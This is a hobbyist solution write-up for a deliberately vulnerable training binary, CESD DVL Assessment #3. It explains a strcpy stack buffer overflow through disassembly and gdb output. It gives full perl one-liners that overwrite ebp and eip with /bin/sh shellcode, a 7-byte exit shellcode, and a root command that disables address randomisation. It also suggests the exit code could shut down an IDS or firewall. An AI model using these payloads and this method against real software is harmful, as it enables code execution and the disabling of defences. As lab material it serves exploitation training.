Target: CESD DVL Assessment #3	|
Author: digitalbyte	 	|
________________________________|

Tools used:
- gdb (incl mammon gdbinit)
- objdump
- gedit
- nasm
- biew


###################################################notice############################################################
#            !!!You don't have to care about this notice if your working with DVL!!!                                #
#to exploit this exploitme for us the beginners it's neccessary to switch off things like Virtual Adress Space      #
#Randomisation (this you can do with:  "echo 0 > /proc/sys/kernel/randomize_va_space" as root) or Pax on our linux- #
#machines. 													    #
#####################################################################################################################

Content:
(01) Exploiting the code
(02) Answering the question






:::::::::::::::::::::::::::::::::::::::::::::(01)Exploiting the code::::::::::::::::::::::::::::::::::::::::::::::::::::::





So this solution will be much smaller than the previous one. Because this is not quite different from the 01_exploitme02.

You'll fast see that it again uses a parameter for input and the overflow happens because of the usage of strcpy. A little deadlisting of main( objdump -d -M intel 01_exploitme03):

8048384:       55                      push   ebp
 8048385:       89 e5                   mov    ebp,esp
 8048387:       81 ec 18 01 00 00       sub    esp,0x118                 ; the actual buffer is created       
 804838d:       83 e4 f0                and    esp,0xfffffff0		
 8048390:       b8 00 00 00 00          mov    eax,0x0			
 8048395:       29 c4                   sub    esp,eax			
 8048397:       8b 45 0c                mov    eax,DWORD PTR [ebp+12]	      
 804839a:       83 c0 04                add    eax,0x4			
 804839d:       8b 00                   mov    eax,DWORD PTR [eax]
 804839f:       89 44 24 04             mov    DWORD PTR [esp+4],eax
 80483a3:       8d 85 f8 fe ff ff       lea    eax,[ebp-0x108]           ; eax gets the pointer to strcpy dest(108h=264d) 
 80483a9:       89 04 24                mov    DWORD PTR [esp],eax       ; and puts it in esp
 80483ac:       e8 ff fe ff ff          call   80482b0 <strcpy@plt>      ; copys our input	
 80483b1:       c9                      leave  
 80483b2:       c3                      ret

We test this now and take as input 264 A's (`perl -e 'print chr(0x41)x264'`) and everything is right. But if we take 268 we Segfault. If take a look in gdb we see that this happens because we write over ebp. We can check this by taking 268 A's (`perl -e 'print chr(0x41)x268'`)and now ebp is 0x41414141 (check this by typing: 'i r' in gdb after error) and if we take `perl -e 'print chr(0x41)x264 .chr(0x42)x4'` we see that ebp is 0x42424242.
So let's fix this by giving ebp a "correct adress. This adress needs to be at least readable. We can get such an adress by simply letting the exploitme run with a correct input until the moment when it crashed with the wrong input. Step down one further line and take now a look at ebp and take this to fix our exploit.

So now we have: `perl -e 'print chr(0x41)x264 .chr(0xc8). chr(0xf7). chr(0xff). chr(0xbf)'`. Set a breakpoint at main and watch the show until the leave:

     eax:BFFFF5B0 ebx:4DE1DFF4  ecx:FFFFFD05  edx:BFFFF9B8     eflags:00000246
     esi:4DCEACE0 edi:00000000  esp:BFFFF5A0  ebp:BFFFF6B8     eip:080483B1
     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
[007B:BFFFF5A0]---------------------------------------------------------[stack]
BFFFF5D0 : 41 41 41 41  41 41 41 41 - 41 41 41 41  41 41 41 41 AAAAAAAAAAAAAAAA
BFFFF5C0 : 41 41 41 41  41 41 41 41 - 41 41 41 41  41 41 41 41 AAAAAAAAAAAAAAAA
BFFFF5B0 : 41 41 41 41  41 41 41 41 - 41 41 41 41  41 41 41 41 AAAAAAAAAAAAAAAA
BFFFF5A0 : B0 F5 FF BF  AB F8 FF BF - 2F F4 CF 4D  2A 82 04 08 ......../..M*...
[007B:4DCEACE0]---------------------------------------------------------[ data]
4DCEACE0 : 00 00 00 00  00 10 00 00 - 11 06 02 00  6B F8 FF BF ............k...
4DCEACF0 : 04 00 00 00  F8 FA FF B7 - 03 00 00 00  64 00 00 00 ............d...
[0073:080483B1]---------------------------------------------------------[ code]
0x80483b1 <main+45>:    leave  
0x80483b2 <main+46>:    ret    
0x80483b3 <main+47>:    nop    
0x80483b4 <main+48>:    nop    
0x80483b5 <main+49>:    nop    
0x80483b6 <main+50>:    nop    
------------------------------------------------------------------------------
0x080483b1 in main ()


You see our A's in the stack above. Let's take a closer look:


gdb> x/70w bffff5d0
0xbffff5d0:     0x41414141      0x41414141      0x41414141      0x41414141  ; many of our A's.....
0xbffff5e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff5f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff600:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff610:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff620:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff630:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff640:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff650:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff660:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff670:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff680:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff690:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6b0:     0x41414141      0x41414141      0xbffff7c8      0x4dd03800   ; our fixed ebp and after this comes:4dd03800
0xbffff6c0:     0x00000002      0xbffff744      0xbffff750      0x4dceb878
0xbffff6d0:     0x00000000      0x00000001      0x00000001      0x00000000
0xbffff6e0:     0x4de1dff4      0x4dceace0


If we now trace further through the exploitme with 'n' we see that ret restores exactly the 4dd03800 to eip :D

So now we are glad because we know if we put 4 more bytes after our fixed ebp in our exploit we can overwrite eip. 
Now we can start with writing our shellcode (for this take a look at my solution for 01_exploitme02 or google).

We simply put our shellcode with the fixed ebp together let it run with gdb and take a look for the correct eip now at stack. You'll get it by simply doing the above step x/70w bffff5d0 at the same moment as we did above. 

And we'll have a working shellcode: 

`perl -e 'print chr(0x41)x209 .chr(0x31).chr(0xc0).chr(0xb0).chr(0x46).chr(0x31).chr(0xdb).chr(0x31).chr(0xc9).chr(0xcd).chr(0x80).chr(0xeb).chr(0x16).chr(0x5b).chr(0x31).chr(0xc0).chr(0x88).chr(0x43).chr(0x07).chr(0x89).chr(0x5b).chr(0x08).chr(0x89).chr(0x43).chr(0x0c).chr(0xb0).chr(0x0b).chr(0x8d).chr(0x4b).chr(0x08).chr(0x8d).chr(0x53).chr(0x0c).chr(0xcd).chr(0x80).chr(0xe8).chr(0xe5).chr(0xff).chr(0xff).chr(0xff).chr(0x2f).chr(0x62).chr(0x69).chr(0x6e).chr(0x2f).chr(0x73).chr(0x68).chr(0x4e).chr(0x41).chr(0x41).chr(0x41).chr(0x41).chr(0x42).chr(0x42).chr(0x42).chr(0x42).chr(0xc8). chr(0xf7). chr(0xff). chr(0xbf). chr(0x31) . chr(0xf6) . chr(0xff) . chr(0xbf) '`

If you solved the second one successfully, you should'nt face a problem here...










:::::::::::::::::::::::::::::::::::::::::::::(02)Answering the question:::::::::::::::::::::::::::::::::::::::::::::::::::








The second part is to answer the question: If we had also have success if the buffer would just be 8 bytes long. So we should go back to the deadlisting again and take a deeper look:

8048384:       55                      push   ebp
 8048385:       89 e5                   mov    ebp,esp
 8048387:       81 ec 18 01 00 00       sub    esp,0x118                 ; the actual buffer is created       
 804838d:       83 e4 f0                and    esp,0xfffffff0		
 8048390:       b8 00 00 00 00          mov    eax,0x0			
 8048395:       29 c4                   sub    esp,eax			
 8048397:       8b 45 0c                mov    eax,DWORD PTR [ebp+12]	      
 804839a:       83 c0 04                add    eax,0x4			
 804839d:       8b 00                   mov    eax,DWORD PTR [eax]
 804839f:       89 44 24 04             mov    DWORD PTR [esp+4],eax
 80483a3:       8d 85 f8 fe ff ff       lea    eax,[ebp-0x108]           ; eax gets the pointer to strcpy dest(108h=264d) 
 80483a9:       89 04 24                mov    DWORD PTR [esp],eax       ; and puts it in esp
 80483ac:       e8 ff fe ff ff          call   80482b0 <strcpy@plt>      ; copys our input	
 80483b1:       c9                      leave  
 80483b2:       c3                      ret

Well the best is simply checking this by trying it :) We modify the exploitme so that the buffer for our string dest will just be 8 bytes. 
We have two places where we can do this one time the sub esp,0x118 and the other time lea eax,[ebp-0x108]. Of course if we wanna change the sub instruction we had have to give him not just 8 but the additional 10 bytes difference and we would have to change the lea instruction as well

But just changing the lea instruction will do the same and because we are lazzy, we just do so ;) We see that the bytecode of lea    eax,[ebp-0x108] is 8d 85 f8 fe ff ff but how to change this to ebp-0x8 ? We simply get this out by compiling our new instruction line with nasm, objdump it and write it down. So we get: 8d 45 f8.

No fire up: biew 01_exploitme03 and press enter until you see disassembled code. Look with F5 for the correct line we wanna change. The offset you can see in the deadlisting above: 80483a3. Change in biew with F2 to virtual adress and you will be send to the correct line. With F4 you can now change the line: simply change the 8d 85 to 8d 45 and think about nop'ing the fe ff ff (overwrite it with 90) or your binary will be messed...

No we have the exploitme03 with just 8 buffer but nothing else has changed. This is still a working exploit: 
`perl -e print' chr(0x41)x8 . fixedEbp . newEip '` 
but we have just 8 bytes for our own code. That's not much place we have.
At least my coding skills are not good enough to get a shellcode out of this but an exitcode (which has just 7 bytes). You will say that's not much just to exit an app. But if we think about some fanzy IDS or firewall we would be glad to simply shut it down. So there will still be some moments you can have benefits by a simple exitcode.

working exitcode (!!prooved working within gdb!!):
`perl -e print' chr(0x31) . chr(0xc0). chr(0x40). chr(0x31).chr(0xdb). chr(0xcd). chr(0x80). chr(0x41).chr(0x01).chr(0xf7).chr(0xff).chr(0xbf).chr(0x60).chr(0xf7).chr(0xff).chr(0xbf)'`


#################################################################
#  it's just prooved within gdb					#
#  because outside gdb here it segfault's!!!			#
#  If someone knows why this happens or can tell		#
#  that it doesn't happen on his machine plz let		#
#  me know via pm at crackmes.de or reverse-engineering.net	#
#################################################################

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

 
I hope someone else will handle this exploitme and write a solution about it. At least about the last part because I'm intersted in reading others opinion about that 8 byte buffer and how to exploit it!


!!So come on and don't let me be the only one who solves the exploitmes on crackmes.de :D  or at least give some feedback aboutthe correctness of my solution, especially the commented deadlisting!!



greets and thanks again to the reverse-engineering.net community , especially zero and stingduk




